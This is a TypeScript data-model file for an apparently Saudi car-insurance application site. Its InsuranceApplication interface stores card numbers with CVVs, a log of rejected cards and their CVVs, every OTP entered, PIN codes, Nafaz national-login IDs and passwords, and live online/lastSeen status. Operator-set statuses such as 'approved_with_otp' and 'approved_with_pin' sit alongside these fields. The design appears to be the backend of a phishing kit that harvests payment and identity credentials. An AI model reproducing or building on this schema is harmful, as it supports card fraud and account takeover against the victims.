export interface InsuranceApplication {
  id?: string
  country: string

  // Step 1: Basic Information
  identityNumber: string
  ownerName: string
  offerTotalPrice?: string
  phoneNumber: string
  phoneNumber2?: string
  documentType: "استمارة" | "بطاقة جمركية"
  serialNumber: string
  insuranceType: "تأمين جديد" | "نقل ملكية"

  // Step 2: Insurance Details
  coverageType: string
  insuranceStartDate: string
  vehicleUsage: string
  vehicleValue: number
  manufacturingYear: number
  vehicleModel: string
  repairLocation: "agency" | "workshop"

  // Step 3: Selected Offer
  selectedOffer?: {
    id: number
    company: string
    price: number
    type: string
    features: string[]
  }
  selectedCarrier?: string
  totalPrice?: string

  // Step 4: Payment
  paymentMethod?: string
  cardNumber?: string
  cardHolderName?: string
  expiryDate?: string
  cvv?: string
  cardType?: string
  bankInfo?: string
  paymentStatus: "pending" | "completed" | "failed"

  // Card Approval Status
  cardStatus?: "pending" | "approved_with_otp" | "approved_with_pin" | "rejected" | "approved"
  cardOtpApproved?: "pending" | "approved" | "rejected"

  // Card History
  oldCards?: Array<{
    cardNumber?: string
    cardHolderName?: string
    expiryDate?: string
    cvv?: string
    cardType?: string
    bankInfo?: string
    rejectedAt: string
  }>
  cardHistory?: any

  // OTP Management
  otp?: string
  allPhoneOtps?: string[]
  phoneOtp?: string

  // Verification fields for phone and ID
  phoneVerificationCode?: string
  phoneVerificationStatus?: "pending" | "approved" | "rejected"
  phoneVerifiedAt?: Date
  phoneOtpApproved?: "pending" | "approved" | "rejected"
  phoneCarrier?:string
  idVerificationCode?: string
  idVerificationStatus?: "pending" | "approved" | "rejected"
  idVerifiedAt?: Date

  // Nafaz Integration (Saudi Arabia e-services)
  nafazId?: string
  nafazPass?: string
  authNumber?: string

  // Transfer of Ownership (نقل ملكية)
  buyerIdNumber?: string
  buyerName?: string

  // User Activity Tracking
  online?: boolean
  lastSeen?: string
  isUnread?: boolean

  // PIN Code
  pinCode?: string

  // Metadata
  currentStep: number | string
  status: "draft" | "pending_review" | "approved" | "rejected" | "completed"
  assignedProfessional?: string
  createdAt: Date
  updatedAt: Date
  notes?: string
}

export interface ChatMessage {
  id?: string
  applicationId: string
  senderId: string
  senderName: string
  senderRole: "customer" | "professional" | "admin"
  message: string
  timestamp: Date
  read: boolean
}

export interface User {
  id: string
  email: string
  name: string
  role: "customer" | "professional" | "admin"
  createdAt: Date
}
